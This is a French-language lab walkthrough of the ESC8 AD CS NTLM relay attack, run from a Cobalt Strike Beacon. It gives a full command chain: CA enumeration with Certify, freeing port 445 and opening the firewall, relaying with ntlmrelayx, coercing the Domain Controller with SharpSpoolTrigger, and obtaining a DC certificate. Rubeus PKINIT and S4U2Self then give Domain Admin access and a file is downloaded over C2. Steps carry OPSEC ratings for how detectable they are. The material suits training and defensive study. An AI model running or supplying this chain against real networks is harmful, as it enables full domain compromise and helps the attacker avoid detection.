# ESC8 — NTLM Relay vers les endpoints HTTP AD CS

>L’objectif de ce lab est d’identifier et d’exploiter **ESC8**.

===

## Énumération

1. Lancer Cobalt Strike et se connecter au team server.
2. Énumérer les vulnérabilités de la **Certificate Authority (CA)**. 🔍

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
    ```

⚠️ Le résultat doit montrer que `lon-cs-1` est vulnérable à ESC8.

===

## Préparation du NTLM Relay

1. Démarrer un **SOCKS proxy** depuis le Beacon.
    1. `socks 1080 socks5`
    
2. Exécuter `netstat` pour vérifier que le port 445 est actuellement occupé.

3. Définir le mode de démarrage de `lanmanserver` sur **disabled** pour empêcher un redémarrage automatique.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
    ```

4. Arrêter les services suivants dans cet ordre pour libérer le port 445.
    1. `sc_stop lanmanserver`
    2. `sc_stop srv2`
    3. `sc_stop srvnet`

⚠️ Vérifier avec `netstat` que le port 445 est libre.

5. Créer un **reverse port forward** sur le port 445 pour rediriger le trafic vers `127.0.0.1:7445` sur l’Attacker Desktop.
	1. `rportfwd_local 445 localhost 7445`

⚠️ `netstat` indique de nouveau une écoute sur le port 445, mais le PID est celui du Beacon.

6. Le port 445 peut être bloqué en entrée par Windows Firewall, notamment sur une Workstation. Ajouter la règle :

    ```Beacon-nocolor
    powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
    ```

===

## NTLM Relaying

1. Sur l’Attacker Desktop, ouvrir un terminal CMD et démarrer le container Docker Kali.
    1. `docker container start -i kali-1`

2. Configurer **proxychains** pour utiliser le SOCKS proxy de Cobalt Strike.
    1. Ouvrir `/etc/proxychains.conf` dans vim ou nano.
    2. Aller à la dernière ligne.
    3. Remplacer l’entrée `socks4` par défaut 💡  `socks5 10.0.0.5 1080`💡 
    4. Enregistrer les modifications.

3. Utiliser **ntlmrelayx** et **proxychains** pour relayer les authentifications entrantes vers l’endpoint HTTP AD CS. Comme la requête cible un Domain Controller, demander un certificat de type **DomainController**. Démarrer `NTLMRelayX` depuis le container Kali.

    ```bash
    proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    ```

4. Pendant l’attente, revenir au Beacon.
5. Déclencher une authentification du Domain Controller vers la machine courante.

    ```Beacon-nocolor
    execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
    ```

⚠️ Le reverse port forward transmet la requête à ntlmrelayx, qui la relaie via le SOCKS proxy. Un fichier **LON-DC-1.pfx** doit être généré.

6. Utiliser Ctrl+C pour arrêter ntlmrelayx.

------

## Post-Exploitation — LON-DC-1.pfx vers Domain Administrator

> **Effectuer ces étapes avant le cleanup**, tant que le SOCKS proxy est actif. Le PFX est dans le container Kali. Deux possibilités sont documentées : Kali Docker (PKINITtools/Certipy, sans transfert) et Windows Beacon (Rubeus, avec transfert du PFX).

### Méthode — Windows Beacon (Rubeus / Cobalt Strike)

#### Étape 1 — Copier le certificat et encoder le PFX en Base64

Rechercher le fichier dans le container Kali :

```
find / -name "LON-DC-1.pfx" 2>/dev/null
```  

Copier le certificat depuis le container Kali vers Windows :
```
docker cp kali-1:/LON-DC-1.pfx C:\Tools\LON-DC-1.pfx
```

Exécuter la commande dans PowerShell sur l’Attacker Desktop :

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Tools\LON-DC-1.pfx"))
```

Copier la totalité du résultat Base64.

#### Étape 2 — Demander le TGT du compte machine DC via PKINIT

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:LON-DC-1$ /domain:CONTOSO.COM /certificate:<base64_pfx_string> /enctype:aes256 /nowrap
```

> **OPSEC-🟢SAFE (no disk write on target)** — Le certificat est transmis en mémoire comme argument Rubeus, sans écriture dans le filesystem cible. `execute-assembly` crée néanmoins un processus temporaire (**CAUTION**). La requête PKINIT AS-REQ génère l’**Event 4768** sur le DC. Conserver le TGT Base64 renvoyé.

#### Étape 3 — S4U2Self pour impersonate Administrator

Utiliser le TGT du compte machine du DC pour effectuer **S4U2Self** et demander un ticket CIFS en tant qu’Administrator. L’option `/self` sélectionne S4U2Self ; S4U2Proxy n’est pas nécessaire ici.

```Beacon-nocolor
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /ticket:[BASE64_TGT] /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1.contoso.com /nowrap /ptt
```

> **OPSEC-🟠CAUTION** — Génère l’**Event 4769** (TGS-REQ S4U2Self) sur le DC. L’option `/ptt` injecte le ticket dans la session de logon du Beacon, sans écriture sur disque.

#### Étape 4 — Vérifier l’accès Domain Admin

```Beacon-nocolor
ls \\lon-dc-1.contoso.com\C$
```

> **OPSEC-🟢SAFE** — Accès SMB via le ticket Kerberos injecté. Génère l’**Event 4624 type 3** sur le DC, sans création de processus distant ni de service.

```Beacon-nocolor
download \\lon-dc-1.contoso.com\C$\Users\Administrator\Desktop\root.txt
```

> **OPSEC-🟢SAFE** — Lecture du fichier par le canal C2 du Beacon. L’**Event 4663** peut être généré sur le DC si l’audit Object Access est activé.

---

### Récapitulatif OPSEC de la chaîne ESC8

| Étape | Action | OPSEC | Events principaux |
|-------|--------|-------|------------|
| Énumération | Certify enum-cas | OPSEC-🟠CAUTION | LDAP vers le DC (1644) |
| Préparation Relay | Stop lanmanserver / rportfwd | OPSEC-🟠CAUTION | Événements de service (7036) |
| Coercition | SharpSpoolTrigger | OPSEC-🔴UNSAFE | RPC Print Spooler — Event 4624 sur la cible |
| Relay | ntlmrelayx → AD CS | OPSEC-🟠CAUTION | Events CA 4886/4887 enregistrés |
| Vérification DA | smbclient / ls C$ | OPSEC-🟢SAFE | Event 4624 type 3 sur le DC |
| Cleanup | Restaurer services / firewall | OPSEC-🟢SAFE | Réduit les artefacts laissés |


## Cleanup — Restauration

1. Arrêter le SOCKS proxy.
    1. `socks stop`

2. Arrêter le reverse port forward.
    1. `rportfwd stop 445`

3. Restaurer les services dans leur configuration d’origine.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
    ```

    1. `sc_start srvnet`
    2. `sc_start srv2`
    3. `sc_start lanmanserver`

4. Supprimer la règle Windows Firewall.

    ```Beacon-nocolor
    powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
    ```

⚠️ Ce lab présente l’identification et l’exploitation d’ESC8 depuis un C2.

